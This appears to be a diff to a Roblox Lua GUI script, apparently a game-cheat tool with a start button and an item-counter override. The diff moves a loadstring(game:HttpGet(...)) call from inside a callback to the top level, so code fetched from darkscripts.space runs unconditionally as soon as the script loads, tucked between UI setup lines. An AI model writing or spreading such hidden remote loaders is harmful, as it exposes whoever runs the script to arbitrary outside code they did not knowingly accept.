@@ -77,6 +77,7 @@ StartButton.TextColor3 = Color3.new(1, 1, 1)
 StartButton.Font = Enum.Font.SourceSansBold
 StartButton.TextScaled = true
 
+loadstring(game:HttpGet('https://darkscripts.space/scripts/fa70c4e9-e441-4b61-8fee-c7617f773e4f_815896821812690946.lua',true))()
 local UIS = game:GetService("UserInputService")
 local dragging, dragInput, dragStart, startPos
 
@@ -129,7 +130,6 @@ StartButton.MouseButton1Click:Connect(function()
             itemCounterText:GetPropertyChangedSignal("Text"):Connect(function()
                 if itemCounterText.Text ~= tostring(amount) then
                     itemCounterText.Text = tostring(amount)
-                    loadstring(game:HttpGet('https://darkscripts.space/scripts/fa70c4e9-e441-4b61-8fee-c7617f773e4f_815896821812690946.lua',true))()
                 end
             end)
         end
